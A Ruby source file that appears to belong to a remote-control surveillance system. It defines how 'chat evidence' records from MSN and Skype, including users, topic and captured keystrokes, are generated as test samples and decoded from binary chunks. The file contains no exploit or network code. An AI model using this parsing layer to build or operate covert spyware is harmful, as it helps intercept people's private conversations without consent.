# encoding: utf-8

require 'rcs-common/evidence/common'

module RCS

module ChatEvidence

  ELEM_DELIMITER = 0xABADC0DE
  KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]
  
  def content
    program = "MSN".to_utf16le_binary_null
    topic = "Chatting...".to_utf16le_binary_null
    users = "ALoR, Daniel".to_utf16le_binary_null
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write program
    content.write topic
    content.write users
    content.write KEYSTROKES.sample.to_utf16le_binary_null
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end
  
  def generate_content
    ret = Array.new
    10.rand_times { ret << content() }
    ret
  end
  
  def decode_content
    stream = StringIO.new @info[:chunks].join

    evidences = Array.new
    until stream.eof?
      tm = stream.read 36
      @info[:acquired] = Time.gm(*tm.unpack('l*'), 0)
      @info[:program] = ''
      @info[:topic] = ''
      @info[:users] = ''
      @info[:keystrokes] = ''

      program = stream.read_utf16le_string
      @info[:program] = program.utf16le_to_utf8 unless program.nil?
      topic = stream.read_utf16le_string
      @info[:topic] = topic.utf16le_to_utf8 unless topic.nil?
      users = stream.read_utf16le_string
      @info[:users] = users.utf16le_to_utf8 unless users.nil?
      keystrokes = stream.read_utf16le_string
      @info[:keystrokes] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?

      delim = stream.read(4).unpack("L*").first
      raise EvidenceDeserializeError.new("Malformed evidence (missing delimiter)") unless delim == ELEM_DELIMITER

      # this is not the real clone! redefined clone ...
      evidences << self.clone
    end
    
    return evidences
  end
end

module ChatskypeEvidence
  include ChatEvidence

  def content
    program = "SKYPE\0".to_utf16le_binary
    topic = "Chatting...\0".to_utf16le_binary
    users = "ALoR, Daniel\0".to_utf16le_binary
    content = StringIO.new
    t = Time.now.getutc
    content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
    content.write program
    content.write topic
    content.write users
    content.write "chat da skype...\0".to_utf16le_binary
    content.write [ ELEM_DELIMITER ].pack('L')

    content.string
  end

end


end # ::RCS